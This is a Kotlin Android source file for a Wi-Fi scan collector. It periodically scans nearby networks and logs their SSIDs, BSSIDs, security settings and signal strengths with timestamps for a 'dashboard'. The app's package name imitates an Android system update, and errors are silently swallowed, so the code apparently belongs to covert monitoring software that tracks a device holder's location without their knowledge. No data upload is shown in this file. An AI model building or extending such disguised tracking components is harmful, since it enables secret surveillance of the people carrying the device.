package com.androidsystem.update.collector

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.ScanResult
import android.net.wifi.WifiManager
import android.os.Build
import androidx.core.content.ContextCompat
import com.androidsystem.update.database.DataRepository
import com.androidsystem.update.database.WifiNetworkEntity
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Periodic Wi-Fi scan -> the dashboard's "Nearby networks" module.
 *
 * Android 13+ restricts passive Wi-Fi scans to a few per hour unless the
 * foreground app owns them. Because this is a foreground service
 * (`dataSync`), the throttle is the much more permissive foreground quota
 * (still throttled, but not the 2/hour background cap). Coarse location
 * (ACCESS_COARSE_LOCATION) is enough for SSID/BSSID on Android 8.1+;
 * ACCESS_FINE_LOCATION grants it implicitly.
 *
 * No-root only. Uses public WifiManager.scanResults, no reflection.
 */
@Singleton
class WifiScanCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: DataRepository
) {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val wifiManager by lazy {
        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
    }

    private val scanReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            if (intent?.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                persistResults()
            }
        }
    }

    private var registered = false

    fun ensureRegistered() {
        if (registered) return
        try {
            context.registerReceiver(
                scanReceiver,
                IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
            )
            registered = true
        } catch (_: Exception) { /* permission missing -> silent skip */ }
    }

    fun triggerScan() {
        if (!hasLocationPermission()) return
        ensureRegistered()
        try {
            wifiManager.startScan()
        } catch (_: Exception) { /* denied by OS throttle or no perm */ }
    }

    fun persistResults() {
        if (!hasLocationPermission()) return
        scope.launch {
            try {
                val results: List<ScanResult> = wifiManager.scanResults ?: return@launch
                val now = System.currentTimeMillis()
                results.forEach { r ->
                    repository.insertWifiNetwork(
                        WifiNetworkEntity(
                            ssid = r.SSID ?: "",
                            bssid = r.BSSID ?: "",
                            capabilities = r.capabilities ?: "",
                            frequency = r.frequency,
                            level = r.level,
                            timestamp = now
                        )
                    )
                }
            } catch (_: Exception) { /* skip */ }
        }
    }

    private fun hasLocationPermission(): Boolean {
        val fine = ContextCompat.checkSelfPermission(
            context, Manifest.permission.ACCESS_FINE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarse = ContextCompat.checkSelfPermission(
            context, Manifest.permission.ACCESS_COARSE_LOCATION
        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }
}
